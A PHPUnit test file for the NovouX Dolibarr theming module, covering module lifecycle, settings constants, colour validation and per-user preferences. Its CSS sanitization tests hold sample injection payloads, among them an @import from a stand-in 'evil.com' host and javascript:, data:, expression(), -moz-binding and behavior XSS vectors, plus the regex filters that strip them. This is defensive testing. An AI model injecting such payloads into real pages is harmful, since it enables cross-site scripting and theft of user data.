<?php
/* Copyright (C) 2025 FlowMatrix-AI
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 */

/**
 * \file       test/phpunit/NovouXModuleTest.php
 * \ingroup    novoux
 * \brief      PHPUnit tests for NovouX module lifecycle and settings
 */

// Bootstrap Dolibarr (path relative to htdocs/custom/novoux/test/phpunit/)
global $conf, $user, $langs, $db;

require_once dirname(__FILE__).'/../../../../master.inc.php';
require_once DOL_DOCUMENT_ROOT.'/core/lib/admin.lib.php';
require_once dirname(__FILE__).'/../../core/modules/modNovoux.class.php';

if (empty($user->id)) {
	$user->fetch(1);
	$user->loadRights();
}
$conf->global->MAIN_DISABLE_ALL_MAILS = 1;

use PHPUnit\Framework\TestCase;

/**
 * @backupGlobals disabled
 * @backupStaticAttributes enabled
 */
class NovouXModuleTest extends TestCase
{
	protected $savconf;
	protected $savuser;
	protected $savlangs;
	protected $savdb;

	public function __construct($name = '')
	{
		parent::__construct($name);
		global $conf, $user, $langs, $db;
		$this->savconf = $conf;
		$this->savuser = $user;
		$this->savlangs = $langs;
		$this->savdb = $db;
	}

	public static function setUpBeforeClass(): void
	{
		global $db;
		$db->begin();
	}

	protected function setUp(): void
	{
		global $conf, $user, $langs, $db;
		$conf = $this->savconf;
		$user = $this->savuser;
		$langs = $this->savlangs;
		$db = $this->savdb;
	}

	public static function tearDownAfterClass(): void
	{
		global $db;
		$db->rollback();
	}

	// --- Module Lifecycle ---

	public function testModuleInit()
	{
		global $conf, $db;
		$module = new modNovoux($db);
		$result = $module->init();
		$this->assertGreaterThanOrEqual(1, $result, 'Module init should succeed');
		$conf->setValues($db);
		return $result;
	}

	/**
	 * @depends testModuleInit
	 */
	public function testModuleRemove()
	{
		global $conf, $db;
		$module = new modNovoux($db);
		$result = $module->remove();
		$this->assertGreaterThanOrEqual(0, $result, 'Module remove should succeed');
		$conf->setValues($db);
	}

	/**
	 * @depends testModuleRemove
	 */
	public function testModuleReInit()
	{
		global $conf, $db;
		$module = new modNovoux($db);
		$result = $module->init();
		$this->assertGreaterThanOrEqual(1, $result, 'Module re-init should succeed');
		$conf->setValues($db);
	}

	// --- Constants ---

	public function testSetPaletteConst()
	{
		global $conf, $db;
		$result = dolibarr_set_const($db, 'NOVOUX_PALETTE', 'blue', 'chaine', 0, '', $conf->entity);
		$this->assertGreaterThan(0, $result);
		$conf->setValues($db);
		$this->assertEquals('blue', getDolGlobalString('NOVOUX_PALETTE'));
	}

	public function testSetDensityConst()
	{
		global $conf, $db;
		$result = dolibarr_set_const($db, 'NOVOUX_DENSITY', 'compact', 'chaine', 0, '', $conf->entity);
		$this->assertGreaterThan(0, $result);
		$conf->setValues($db);
		$this->assertEquals('compact', getDolGlobalString('NOVOUX_DENSITY'));
	}

	public function testSetRadiusConst()
	{
		global $conf, $db;
		$result = dolibarr_set_const($db, 'NOVOUX_RADIUS', 'pill', 'chaine', 0, '', $conf->entity);
		$this->assertGreaterThan(0, $result);
		$conf->setValues($db);
		$this->assertEquals('pill', getDolGlobalString('NOVOUX_RADIUS'));
	}

	public function testSetDarkModeConst()
	{
		global $conf, $db;
		$result = dolibarr_set_const($db, 'NOVOUX_DARK_MODE', 'toggle', 'chaine', 0, '', $conf->entity);
		$this->assertGreaterThan(0, $result);
		$conf->setValues($db);
		$this->assertEquals('toggle', getDolGlobalString('NOVOUX_DARK_MODE'));
	}

	// --- Color Validation ---

	public function testValidHexColor()
	{
		$color = '#1a2b3c';
		$this->assertMatchesRegularExpression('/^#[0-9a-fA-F]{6}$/', $color);
	}

	public function testInvalidHexColorRejected()
	{
		$color = '#ZZZZZZ';
		$this->assertDoesNotMatchRegularExpression('/^#[0-9a-fA-F]{6}$/', $color);
	}

	public function testEmptyColorAccepted()
	{
		// Empty string means "no override" — valid
		$color = '';
		$valid = empty($color) || preg_match('/^#[0-9a-fA-F]{6}$/', $color);
		$this->assertTrue((bool) $valid);
	}

	// --- CSS Sanitization ---

	public function testCssTruncation()
	{
		$longCss = str_repeat('a', 5000);
		if (strlen($longCss) > 4096) {
			$longCss = substr($longCss, 0, 4096);
		}
		$this->assertEquals(4096, strlen($longCss));
	}

	public function testCssImportStripped()
	{
		$input = '@import url("https://evil.com/steal.css"); body { color: red; }';
		$output = preg_replace('/@import\b/i', '', $input);
		$this->assertStringNotContainsString('@import', $output);
		$this->assertStringContainsString('body { color: red; }', $output);
	}

	public function testCssExpressionStripped()
	{
		$input = 'div { width: expression(alert(1)); }';
		$output = preg_replace('/expression\s*\(/i', '', $input);
		$this->assertStringNotContainsString('expression(', $output);
	}

	public function testCssJavascriptUrlStripped()
	{
		$input = 'div { background: url(javascript:alert(1)); }';
		$output = preg_replace('/url\s*\(\s*["\']?javascript:/i', 'url(blocked:', $input);
		$this->assertStringNotContainsString('javascript:', $output);
		$this->assertStringContainsString('url(blocked:', $output);
	}

	public function testCssDataUrlStripped()
	{
		$input = 'div { background: url(data:text/html,<script>alert(1)</script>); }';
		$output = preg_replace('/url\s*\(\s*["\']?data:/i', 'url(blocked:', $input);
		$this->assertStringNotContainsString('url(data:', $output);
		$this->assertStringContainsString('url(blocked:', $output);
	}

	public function testCssMozBindingStripped()
	{
		$input = 'div { -moz-binding: url("xbl.xml#xss"); }';
		$output = preg_replace('/-moz-binding\s*:/i', '-blocked:', $input);
		$this->assertStringNotContainsString('-moz-binding:', $output);
	}

	public function testCssBehaviorStripped()
	{
		$input = 'div { behavior: url(xss.htc); }';
		$output = preg_replace('/behavior\s*:/i', 'blocked:', $input);
		$this->assertStringNotContainsString('behavior:', $output);
	}

	public function testCssValidRulesPreserved()
	{
		$input = '.card { border-radius: 8px; background: var(--novo-primary); box-shadow: 0 2px 4px rgba(0,0,0,.1); }';
		$output = $input;
		$output = preg_replace('/<\/?script[^>]*>/i', '', $output);
		$output = preg_replace('/expression\s*\(/i', '', $output);
		$output = preg_replace('/url\s*\(\s*["\']?javascript:/i', 'url(blocked:', $output);
		$output = preg_replace('/@import\b/i', '', $output);
		$output = preg_replace('/url\s*\(\s*["\']?data:/i', 'url(blocked:', $output);
		$output = preg_replace('/-moz-binding\s*:/i', '-blocked:', $output);
		$output = preg_replace('/behavior\s*:/i', 'blocked:', $output);
		$this->assertEquals($input, $output, 'Valid CSS should pass through sanitization unchanged');
	}

	// --- Per-User Preferences ---

	public function testUserPrefOverridesGlobalPalette()
	{
		global $conf, $db, $user;

		// Set admin global palette
		dolibarr_set_const($db, 'NOVOUX_PALETTE', 'slate', 'chaine', 0, '', $conf->entity);
		$conf->setValues($db);

		// Set user preference
		dol_set_user_param($db, $conf, $user, array('NOVOUX_USER_PALETTE' => 'warm'));
		$user->loadPersonalConf();

		// Simulate precedence logic from novo-inject.css.php
		$palette = '';
		if (!empty($user->conf->NOVOUX_USER_PALETTE)) {
			$palette = $user->conf->NOVOUX_USER_PALETTE;
		}
		if (empty($palette)) {
			$palette = getDolGlobalString('NOVOUX_PALETTE', 'default');
		}

		$this->assertEquals('warm', $palette, 'User param should override global const');
	}

	public function testUserPrefFallsBackToGlobal()
	{
		global $conf, $db, $user;

		// Set admin global palette
		dolibarr_set_const($db, 'NOVOUX_PALETTE', 'green', 'chaine', 0, '', $conf->entity);
		$conf->setValues($db);

		// Clear user preference
		dol_set_user_param($db, $conf, $user, array('NOVOUX_USER_PALETTE' => ''));
		$user->loadPersonalConf();

		// Simulate precedence logic
		$palette = '';
		if (!empty($user->conf->NOVOUX_USER_PALETTE)) {
			$palette = $user->conf->NOVOUX_USER_PALETTE;
		}
		if (empty($palette)) {
			$palette = getDolGlobalString('NOVOUX_PALETTE', 'default');
		}

		$this->assertEquals('green', $palette, 'Should fall back to global const when user pref is empty');
	}

	public function testUserPrefDensityOverride()
	{
		global $conf, $db, $user;

		// Set admin global density
		dolibarr_set_const($db, 'NOVOUX_DENSITY', 'default', 'chaine', 0, '', $conf->entity);
		$conf->setValues($db);

		// Set user preference to compact
		dol_set_user_param($db, $conf, $user, array('NOVOUX_USER_DENSITY' => 'compact'));
		$user->loadPersonalConf();

		// Simulate precedence logic
		$density = '';
		if (!empty($user->conf->NOVOUX_USER_DENSITY)) {
			$density = $user->conf->NOVOUX_USER_DENSITY;
		}
		if (empty($density)) {
			$density = getDolGlobalString('NOVOUX_DENSITY', 'default');
		}

		$this->assertEquals('compact', $density, 'User density pref should override global');
	}
}
